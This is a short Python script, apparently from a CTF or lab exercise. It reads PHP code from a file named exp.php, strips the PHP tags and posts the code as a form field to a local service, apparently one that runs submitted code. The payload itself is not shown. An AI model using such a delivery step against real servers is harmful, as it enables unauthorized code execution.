import requests

with open("exp.php", "r") as f:
    data = f.read()
    data = data.replace("<?php", "").replace("?>", "")


data = {"bhb": data}

r = requests.post("http://127.0.0.1:4444", data)

print(r.status_code, r.text)
